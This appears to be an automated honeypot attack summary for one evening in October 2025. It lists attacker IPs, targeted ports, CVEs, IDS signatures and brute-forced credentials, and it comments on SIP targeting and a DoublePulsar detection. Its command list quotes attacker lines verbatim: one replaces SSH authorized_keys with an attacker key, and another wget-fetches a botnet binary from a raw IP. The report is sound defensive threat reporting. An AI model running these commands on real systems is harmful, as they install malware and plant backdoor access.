Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-12T23:01:33Z
**Timeframe:** 2025-10-12T22:20:01Z - 2025-10-12T23:00:01Z
**Files Used:**
- agg_log_20251012T222001Z.json
- agg_log_20251012T224001Z.json
- agg_log_20251012T230001Z.json

**Executive Summary**

This report summarizes 21,304 attacks recorded across the honeypot network. The most active honeypot was Cowrie, with 8,446 events. The most frequent attacker IP was 216.9.225.39, with 1,470 attacks. Port 5060 (SIP) was the most targeted port. Several CVEs were identified, and attackers were observed attempting to manipulate SSH authorized_keys, perform system reconnaissance, and download malicious files. A significant detection of the DoublePulsar backdoor was also noted.

**Detailed Analysis**

**Attacks by Honeypot:**
- Cowrie: 8446
- Sentrypeer: 3500
- Suricata: 2994
- Honeytrap: 2299
- Ciscoasa: 1894
- Dionaea: 933
- Mailoney: 113
- ssh-rsa: 32
- Tanner: 27
- H0neytr4p: 22
- ConPot: 10
- Honeyaml: 11
- Redishoneypot: 12
- Adbhoney: 7
- ElasticPot: 3
- Ipphoney: 1

**Top Attacking IPs:**
- 216.9.225.39: 1470
- 111.235.64.172: 1340
- 45.128.199.212: 1163
- 196.251.88.103: 981
- 20.2.136.52: 750
- 103.183.74.46: 584
- 103.61.123.132: 401
- 93.120.158.134: 441
- 43.140.219.6: 448
- 129.154.42.120: 372
- 123.139.116.220: 376
- 172.86.95.98: 362
- 91.237.163.112: 387
- 103.97.177.230: 324
- 62.141.43.183: 324

**Top Targeted Ports/Protocols:**
- 5060: 3500
- TCP/445: 1337
- 22: 1241
- 1443: 169
- TCP/21: 222
- 5903: 188
- 21: 112
- 25: 113
- 8333: 87
- 3306: 73
- 5908: 83
- 5909: 83
- 5901: 74
- 23: 77

**Most Common CVEs:**
- CVE-2022-27255
- CVE-2019-11500
- CVE-2021-3449
- CVE-2024-3721
- CVE-2005-4050
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-1999-0183

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa ...\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- whoami
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1333
- ET DROP Dshield Block Listed Source group 1: 419
- ET SCAN NMAP -sS window 1024: 161
- ET FTP FTP PWD command attempt without login: 108
- ET FTP FTP CWD command attempt without login: 108
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 96
- ET INFO Reserved Internal IP Traffic: 62
- ET SCAN Suspicious inbound to PostgreSQL port 5432: 27

**Users / Login Attempts:**
- cron/: 67
- 345gs5662d34/345gs5662d34: 38
- root/: 32
- holu/holu: 12
- vpn/vpnpass: 11
- admin1234/admin1234: 14
- mega/123: 10
- deploy/123123: 7
- User-Agent: Go-http-client/1.1/Connection: close: 12
- ftpuser/ftppassword: 9

**Files Uploaded/Downloaded:**
- ohshit.sh;: 4
- pen.sh;: 2
- arm.urbotnetisass;: 1
- arm5.urbotnetisass;: 1
- arm6.urbotnetisass;: 1
- arm7.urbotnetisass;: 1
- x86_32.urbotnetisass;: 1
- mips.urbotnetisass;: 1
- mipsel.urbotnetisass;: 1

**HTTP User-Agents:**
- No user agents recorded.

**SSH Clients and Servers:**
- No SSH clients or servers recorded.

**Top Attacker AS Organizations:**
- No AS organizations recorded.

**Key Observations and Anomalies**

- **VoIP/SIP Targeting:** The high volume of traffic to port 5060 suggests a concerted effort to target SIP-based VoIP systems, likely for toll fraud or to establish a foothold in enterprise networks.
- **Persistent Access Attempts:** The repeated execution of commands to modify `.ssh/authorized_keys` is a clear indicator of attackers attempting to establish persistent, passwordless access to the compromised system.
- **Critical Backdoor Detection:** The triggering of the "DoublePulsar Backdoor installation communication" signature is a high-severity alert. DoublePulsar is a known backdoor associated with the NSA-leaked EternalBlue exploit and is used to deliver ransomware and other malware.
- **Malware Download and Execution:** Attackers were observed downloading and attempting to execute shell scripts and ELF binaries (urbotnetisass) from external servers. This indicates a clear attempt to install malware on the honeypot.
- **System Reconnaissance:** A significant number of commands were used for system reconnaissance, such as checking CPU information, memory, and running processes. This is a common precursor to more targeted attacks.